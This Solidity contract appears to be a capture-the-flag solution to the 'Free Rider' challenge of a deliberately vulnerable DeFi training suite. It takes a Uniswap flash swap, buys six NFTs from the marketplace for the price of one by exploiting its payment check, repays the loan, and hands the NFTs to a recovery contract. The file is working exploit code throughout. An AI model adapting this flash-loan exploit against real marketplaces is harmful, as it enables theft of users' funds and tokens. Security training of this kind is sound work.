// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../DamnValuableNFT.sol";
//import "../DamnValuableToken.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "./FreeRiderNFTMarketplace.sol";
import "solmate/src/tokens/WETH.sol";
import "./FreeRiderRecovery.sol";
import "hardhat/console.sol";
//import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
contract flashswap{
    address player;
    FreeRiderNFTMarketplace market;
    WETH weth;
    DamnValuableNFT nft;
    //uint256 amount = 15 ether;
    //DamnValuableToken token;
    FreeRiderRecovery recovery;
    address pair;
    uint256[] tokens = [0,1,2,3,4,5];
    constructor(address payable _weth,address payable _market,address _nft,address _player, address _recovery,address _pair) payable{
        weth = WETH (_weth);
        market = FreeRiderNFTMarketplace(_market);
        //token = DamnValuableToken(_token);
        nft = DamnValuableNFT(_nft);
        player = _player;
        recovery = FreeRiderRecovery(_recovery);
        pair = _pair;
    }
    function uniswapV2Call(address, uint amount0, uint, bytes calldata) public {
        console.log(weth.balanceOf(pair));
        weth.withdraw(amount0);//swap函数直接贷了WEHT，这里withdraw换成ETH好购买NFT
        market.buyMany{value:amount0}(tokens);
        weth.deposit{value:(amount0*100301)/100000}();
        weth.transfer(pair, (amount0*100301)/100000);
    }
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
    
    function transferasset() public{
        payable(address(player)).transfer(address(this).balance);
        for(uint i =0;i<6;i++){
            nft.safeTransferFrom(address(this),address(recovery),i,abi.encode(address(player)));
        }
        
    }
    
    receive() external payable {}
}